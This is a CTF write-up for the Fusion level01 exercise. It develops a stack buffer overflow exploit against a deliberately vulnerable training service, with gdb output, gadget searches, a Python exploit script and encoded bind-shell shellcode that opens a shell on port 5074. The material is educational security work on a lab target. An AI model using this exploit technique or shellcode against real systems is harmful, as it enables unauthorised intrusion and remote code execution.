+++
author = "pwntester"
categories = ["CTF", "Fusion", "exploit", "level01"]
date = 2013-12-29T10:14:00Z
description = ""
draft = false
slug = "fusion-level01-write-up"
tags = ["CTF", "Fusion", "exploit", "level01"]
title = "Fusion level01 write-up"

+++

## Fusion level01
This [level](http://exploit-exercises.com/fusion/level01) implements stack/heap/mmap ASLR but the stack is still executable:

![](/images/octopress/fusion01.png)

The code provided is exactly the same but there is no info leak this time.

We start off overwriting EIP to crash the application and taking a look:

```lang-bash line-numbers 
python -c 'print "GET " + "A"*139 + "DDDD" + " HTTP/1.1" + "\x90"*16 + "B"*80'| nc localhost 20001
```

Monitoring with gdb we get:

```lang-bash line-numbers 
(gdb) attach 1521
Attaching to program: /opt/fusion/bin/level01, process 1521
Reading symbols from /lib/i386-linux-gnu/libc.so.6...Reading symbols from /usr/lib/debug/lib/i386-linux-gnu/libc-2.13.so...done.
done.
Loaded symbols for /lib/i386-linux-gnu/libc.so.6
Reading symbols from /lib/ld-linux.so.2...(no debugging symbols found)...done.
Loaded symbols for /lib/ld-linux.so.2
0xb7839424 in __kernel_vsyscall ()
(gdb) set follow-fork-mode child
(gdb) c
Continuing.
[New process 1584]

Program received signal SIGSEGV, Segmentation fault.
[Switching to process 1584]
0x44444444 in ?? ()
```

Once it crashes, we take a look at the registers:

```lang-bash line-numbers 
(gdb) i r
eax            0x1	1
ecx            0xb76b48d0	-1217705776
edx            0xbff7ff10	-1074266352
ebx            0xb782cff4	-1216163852
esp            0xbff7ff10	0xbff7ff10
ebp            0x41414141	0x41414141
esi            0xbff7ffc4	-1074266172
edi            0x8049ed1	134520529
eip            0x44444444	0x44444444
eflags         0x10246	[ PF ZF IF RF ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
```

And one by one, we see what is there. We find that **esi** is pointing to our NOP sled. how convenient!!

```lang-bash line-numbers 
(gdb) x/30x $esi
0xbff7ffc4:	0x90909090	0x90909090	0x90909090	0x90909090
0xbff7ffd4:	0x42424242	0x42424242	0x42424242	0x42424242
0xbff7ffe4:	0x42424242	0x42424242	0x42424242	0x42424242
0xbff7fff4:	0x42424242	0x42424242	0x42424242	0x42424242
0xbff80004:	0x42424242	0x42424242	0x42424242	0x42424242
0xbff80014:	0x42424242	0x42424242	0x42424242	0x42424242
0xbff80024:	0x0000000a	0x00000000	0x00000000	0x00000000
0xbff80034:	0x00000000	0x00000000
```

So if we find the opcodes for **jmp esi** in .text we will be able to jump to our shellcode:

```lang-bash line-numbers 
fusion@fusion:~$ /opt/metasploit-framework/msfelfscan -j esi /opt/fusion/bin/level01
[/opt/fusion/bin/level01]
```

No luck, but we can still use the "jmp esp" technique to jump to the address right after our return address and we can place a "jmp esi" there since we control it.

Lets look for the jmp esp opcodes:

```lang-bash line-numbers 
fusion@fusion:~$ /opt/metasploit-framework/msfelfscan -j esp /opt/fusion/bin/level01
[/opt/fusion/bin/level01]
0x08049f4f jmp esp
```

Nice! now, the opcodes for "jmp esi" are "ff06"

So our exploit should look like:

```lang-python line-numbers 
#!/usr/bin/python

from socket import *
from struct import *

s = socket(AF_INET, SOCK_STREAM)
s.connect(("localhost", 20001))

shellcode = "\xeb\x02\xeb\x05\xe8\xf9\xff\xff\xff\x5f\x81\xef\xdf\xff\xff\xff\x57\x5e\x29\xc9\x80\xc1\xb8\x8a\x07\x2c\x41\xc0\xe0\x04\x47\x02\x07\x2c\x41\x88\x06\x46\x47\x49\xe2\xedDBMAFAEAIJMDFAEAFAIJOBLAGGMNIADBNCFCGGGIBDNCEDGGFDIJOBGKBAFBFAIJOBLAGGMNIAEAIJEECEAEEDEDLAGGMNIAIDMEAMFCFCEDLAGGMNIAJDIJNBLADPMNIAEBIAPJADHFPGFCGIGOCPHDGIGICPCPGCGJIJODFCFDIJOBLAALMNIA"

ret = "\x4f\x9f\x04\x08" #jmp esp
jmpesi = "\x90\x90\x06\xff" # jmp esi opcodes
payload =  "GET " + "A"*139 + ret + jmpesi + " HTTP/1.1 " + "\x90"*16 +  shellcode
s.send(payload)
s.close()
```

Lets check it by setting a breakpoint just before "fix_path" ret opcode and reviewing the memory at that point:

```lang-bash line-numbers 
(gdb) b *fix_path+63
Breakpoint 1 at 0x8049854: file level01/level01.c, line 9.
(gdb) c
Continuing.
[New process 1709]
[Switching to process 1709]

Breakpoint 1, 0x08049854 in fix_path (path=Cannot access memory at address 0x41414149
) at level01/level01.c:9
9	level01/level01.c: No such file or directory.
	in level01/level01.c
(gdb) x/x $esp
0xbff7ff0c:	0x08049f4f
(gdb) x/i 0x08049f4f
   0x8049f4f:	jmp    *%esp
(gdb) x/x $esp+4
0xbff7ff10:	0x9090e6ff
(gdb) x/i $esp+4
   0xbff7ff10:	jmp    *%esi
(gdb) x/30x $esi
0xbff7ffc8:	0x90909020	0x90909090	0x90909090	0x90909090
0xbff7ffd8:	0xeb02eb90	0xfff9e805	0x815fffff	0xffffdfef
0xbff7ffe8:	0x295e57ff	0xb8c180c9	0x412c078a	0x4704e0c0
0xbff7fff8:	0x412c0702	0x47460688	0x44ede249	0x46414d42
0xbff80008:	0x49414541	0x46444d4a	0x46414541	0x4f4a4941
0xbff80018:	0x47414c42	0x494e4d47	0x4e424441	0x47434643
0xbff80028:	0x42494747	0x45434e44	0x46474744	0x4f4a4944
0xbff80038:	0x424b4742	0x46424641
```

Oppps, with the new "jmp esi" opcodes in the payload, now **esi** points to a \x20 (space) so if we continue execution, it will segfault at 0xbff7ffc8:

```lang-bash line-numbers 
(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0xbff7ffc8 in ?? ()
```

So lets remove the whitespace after "HTTP/1.1" to make our exploit work and run it again:

New payload:

```lang-python line-numbers 
ret = "\x4f\x9f\x04\x08" #jmp esp
jmpesi = "\xff\xe6\x90\x90" # jmp esi opcodes
payload =  "GET " + "A"*139 + ret + jmpesi + " HTTP/1.1" + "\x90"*16 +  shellcode
```


```lang-bash line-numbers 
fusion@fusion:~$ python fusion01.py
fusion@fusion:~$ sudo netstat -natp | grep LISTEN
tcp        0      0 0.0.0.0:20002           0.0.0.0:*               LISTEN      1539/level02
tcp        0      0 0.0.0.0:20003           0.0.0.0:*               LISTEN      1533/level03
tcp        0      0 0.0.0.0:20004           0.0.0.0:*               LISTEN      1530/level04
tcp        0      0 0.0.0.0:20005           0.0.0.0:*               LISTEN      1527/level05
tcp        0      0 0.0.0.0:20006           0.0.0.0:*               LISTEN      1524/level06
tcp        0      0 0.0.0.0:20008           0.0.0.0:*               LISTEN      911/level08
tcp        0      0 0.0.0.0:5074            0.0.0.0:*               LISTEN      1737/level01
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      743/sshd
tcp        0      0 0.0.0.0:20000           0.0.0.0:*               LISTEN      1544/level00
tcp        0      0 0.0.0.0:20001           0.0.0.0:*               LISTEN      1521/level01
tcp6       0      0 :::22                   :::*                    LISTEN      743/sshd
fusion@fusion:~$ nc localhost 5074
id
uid=20001 gid=20001 groups=20001
```





